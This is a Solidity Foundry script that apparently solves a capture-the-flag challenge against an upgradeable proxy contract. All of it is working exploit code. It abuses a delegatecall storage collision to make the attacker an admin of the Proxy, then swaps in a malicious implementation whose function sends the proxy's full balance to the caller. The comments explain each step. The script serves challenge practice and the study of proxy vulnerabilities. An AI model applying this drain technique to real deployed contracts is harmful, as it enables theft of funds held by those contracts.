// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.13;

import {Script, console2} from "forge-std/Script.sol";

import {Database} from "../src/Database.sol";
import {Proxy} from "../src/Proxy.sol";

contract ResolutionScript is Script {
    Database internal implementation;
    Proxy internal proxy;
    address internal user;

    event log(uint n);
    event log(string s);

    function setUp() public {
        implementation = new Database();
        proxy = new Proxy(address(implementation));
        user = makeAddr("user");
    }

    function run() public {
        vm.deal(user, 100_000 ether);
        Database(address(proxy)).fund{value: 100_000 ether}();

        vm.startPrank(user);
        solution();
        vm.stopPrank();

        require(isSolved(), "Not solved");
    }

    function solution() internal {
        //true extended to bytes32
        bytes32 b = hex"0000000000000000000000000000000000000000000000000000000000000001";

        //write "user" as admin in Proxy thanks to the delegatecall in the fallback function.
        //the write actually happens in the _admins mapping in the Proxy contract
        //as such Proxy is providing the funds sent via "msg.sender.call" i Database.write
        Database(address(proxy)).write(uint256(uint160(user)), b);

        //set implementation to my own "db"
        UnreliableExpensiveDB myDB = new UnreliableExpensiveDB();
        proxy.setImplementation(address(myDB));

        //use the delegatecall to make Proxy pay again, but much more
        UnreliableExpensiveDB(address(proxy)).whatev();
    }

    function isSolved() internal view returns (bool) {
        return address(proxy).balance == 0;
    }
}

contract UnreliableExpensiveDB
{
    function whatev() external {
        (bool success,) = msg.sender.call{value: 9.99999999e22}("");
        require(success, "Failed to send Ether");
    }
}


